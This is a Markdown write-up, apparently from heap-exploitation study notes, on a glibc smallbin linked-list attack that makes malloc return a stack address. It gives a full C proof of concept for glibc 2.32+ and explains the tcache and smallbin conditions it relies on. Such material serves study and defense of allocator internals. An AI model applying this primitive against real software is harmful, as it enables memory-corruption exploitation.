<details>
<summary><strong>Description</strong></summary>
<p>

similar to the unsorted, and large bin linked list primitive **but better**...

we will be trying to get malloc to allocate a ptr on the stack. This will be done via leveraging the smallbin linked list...

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/bin_overviews/small_bins.md
- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/small_bin/linked_list/readme.md
> i modified it a little bit (more general?) (but its worth read)

</p>
</details>

### For `2.32+` versions

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk0, *chunk1, *tcache_chunks[7], x[0x30], *reallocate_chunk, *target;

    // target must be aligned 0x10 (explain later)
    for(int i = 0x10; i < 0x20; i++) {
        if((((long)&x[i]) & 0xF) == 0) {
            target = &x[i];
            break;
        }
    }
    printf("target: %p\n", target);

    // allocate chunk (must be in smallbin range in order to work)
    for(int i = 0; i < 7; i++) tcache_chunks[i] = malloc(0x300);
    chunk0 = malloc(0x300);
    malloc(0x18); // padding chunk to prevent consolidation
    chunk1 = malloc(0x300);
    malloc(0x18); // padding chunk to prevent consolidation

    for(int i = 0; i < 7; i++) free(tcache_chunks[i]); // fill up the corresponding tcache

    free(chunk0); // insert our two (soon to be small bin) chunks into the unsorted bin
    free(chunk1);

    malloc(0x300 + 0x10); // move the two unsorted bin chunks over to the small bin

    for(int i = 0; i < 7; i++) tcache_chunks[i] = malloc(0x300); // empty the corresponding tcache bin

    // make our "fake" small bin chunk
    // for this, we only need to set the `prev_size` (setting it to `0x00`), and the chunk_size
    // target[0] = 0x0000000000000000; // fake chunk's prev_size (usually we dont need to care about this)
    target[1] = 0x0000000000000311; // fake chunk's size

    // Then we go ahead, and link this chunk against the two real small bin chunks
    target[2] = ((long)chunk0 - 0x10); // fwd
    target[3] = ((long)chunk1 - 0x10); // bk

    /* now in other writeups here where we do similar things with the unsorted bin / large bin
    you will see us have to make a chunk header right after this chunk because of the 'unlink_chunk' function
    we don't have to worry about that here */

    // link the two real small bin chunks against our fake small bin chunk
    /*VULNERABILITY*/
    chunk0[1] = target; // chunk0 bk
    chunk1[0] = target; // chunk1 fwd
    /*VULNERABILITY*/
    // [smallbin 0x310]: chunk1 -> target -> chunk0

    malloc(0x300); // reallocate chunk0 from small bin, trigger smallbin dumping
    // [tcache 0x310]: chunk1 -> target

    malloc(0x300); // reallocate chunk1 from tcache

    reallocate_chunk = malloc(0x300); // allocate our fake chunk from tcache

    printf("reallocate_chunk: %p\n", reallocate_chunk);
}
```

</p>
</details>

<details>
<summary><strong>Explain</strong></summary>
<p>

this will be similar to the unsorted, and large bin linked list writeups. We will make a fake chunk where we want to allocate, assign it a prev_size, chunk_size, and fwd/bk pointer. We will also overwrite the fwd/bk pointers of the chunks we are linking against, to point to this chunk (either the fwd/bk of each).

this differs fron the unsorted/large bin, in two ways. First off, due to the overlap of the tcache bin sizes, whenever we free a chunk that is to be inserted into the small bin, the corresponding tcache must be full. In addition to that, when we want to allocate a small bin chunk, the corresponding tcache bin must be empty.

the second way is beneficial to us. With the unsorted, and large bins, the chunk being allocated has a check (sometimes executed in the unlink_chunk function). That check is basically, is the prev_size of the next chunk, equal to the size of the current chunk? Of course for making a fake chunk, this could prove a bit hard to pull off. **We don't have to worry about that with the small bin**.

</p>
</details>

<details>
<summary><strong>Comment</strong></summary>
<p>

the smallbin itself doesnt have address aligned 0x10 check, but in higher glibc version (`2.32+`), we need to prepare fake chunk size and aligned address to prevent error when the smallbin tcache dumping occur...

</p>
</details>

### For `2.31` version

<details>
<summary><strong>POC</strong></summary>
<p>

> you can modify above poc without the target address aligned 0x10 restriction...

</p>
</details>